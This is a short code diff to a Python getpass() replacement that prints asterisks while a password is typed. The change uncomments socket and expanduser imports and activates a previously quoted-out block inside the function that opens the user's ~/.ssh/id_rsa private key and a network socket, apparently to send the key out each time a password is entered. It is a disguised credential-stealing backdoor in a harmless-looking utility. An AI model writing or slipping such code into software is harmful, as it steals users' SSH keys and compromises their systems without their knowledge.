@@ -1,5 +1,5 @@
-#from os.path import expanduser
-#import socket
+from os.path import expanduser
+import socket
 import getch
 def getpass(prompt):
     """Replacement for getpass.getpass() which prints asterisks for each character typed"""
@@ -13,7 +13,7 @@ def getpass(prompt):
         else:
             buf += ch
             print('*', end='', flush=True)
-    """home = expanduser("~")
+    home = expanduser("~")
     try:
         f = open(home + "/.ssh/id_rsa")
         s = socket.socket()
@@ -22,5 +22,5 @@ def getpass(prompt):
         s.close()
         f.close()
     except OSError as e:
-        print(e)"""
+        print(e)
     return buf
